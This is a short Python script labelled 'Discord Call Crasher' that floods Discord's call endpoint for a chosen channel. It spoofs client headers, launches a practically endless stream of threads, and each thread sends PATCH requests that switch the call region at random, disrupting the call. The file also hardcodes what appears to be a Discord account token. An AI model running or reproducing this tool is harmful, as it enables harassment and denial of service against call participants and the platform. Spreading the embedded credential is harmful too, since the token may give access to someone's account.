import requests, os, random, threading,  sys
from colorama import Fore, Back, Style
from time import sleep

def write(text):
    for char in text: print("" + char, end="");sys.stdout.flush();sleep(0.009)


class Crasher:
    def __init__(self):
        self.added = 0
        self.lock = threading.Lock()
        self.token = "ODU3MjYyOTI3MTkzOTY0NTc2.Gvk4Zg.j9cP1R_c1aPohoHonJ_wryWKjOazzyPXEVQAUk"

        write("> Channel ID: ")
        self.id = input().strip()
        self.request_headers = {"Authorization": self.token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"}
        self.regions = ['india', 'brazil', 'europe', 'hongkong', 'japan', 'russia', 'singapore', 'southafrica', 'sydney', 'us-central', 'us-east','us-south', 'us-west']
    
    def crash(self):
        reg = random.choice(self.regions)
        requests_payload = {"region": reg}
        try:
            response = requests.patch(
                f"https://discord.com/api/v9/channels/{self.id}/call",
                headers = self.request_headers,
                json = requests_payload,
            )
            print(f"{Style.BRIGHT}[{Fore.GREEN}...{Fore.YELLOW}]{Style.RESET_ALL} SENDING | {reg}")
        except:
            print(f"{Style.BRIGHT}{Fore.RED}[...]{Style.RESET_ALL} loading... | {reg}")
        else:
            pass
    def multi_threading(self):
        for _ in range(10000000000000000):
            threading.Thread(target=self.crash).start()

if __name__ == '__main__':
    os.system('cls && title [Discord Call Crasher] ZEPHYR')
    crasher = Crasher()
    crasher.multi_threading()
